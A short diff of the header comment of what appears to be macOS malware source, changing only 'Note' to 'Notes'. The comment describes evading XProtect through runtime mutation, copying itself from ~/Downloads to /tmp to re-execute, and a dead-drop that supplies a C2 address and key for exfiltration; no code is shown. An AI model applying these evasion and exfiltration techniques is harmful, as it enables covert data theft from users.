@@ -1,6 +1,5 @@
 /*
  * + Author: 0x00s
- * + Notes:
  * - macOS Gatekeeper may flag it based on static heuristics, 
  * - XProtect consistently fails to detect it due to runtime mutation.
  * - Originally developed from internal research and shared publicly to demonstrate core techniques.
@@ -17,7 +16,7 @@
  *     - If running from ~/Downloads, it copies itself to /tmp and re-executes.
  *     - If all good, it proceeds with its main routine.
  *
- * + Note:
+ * + Notes:
  *   - Execution follows a simple call sequence.
  *   - OvernOut() requires a few tweaks in logic order to proceed with the dead-drop
  *     and extract the C2 address and public key for exfiltration. ;)
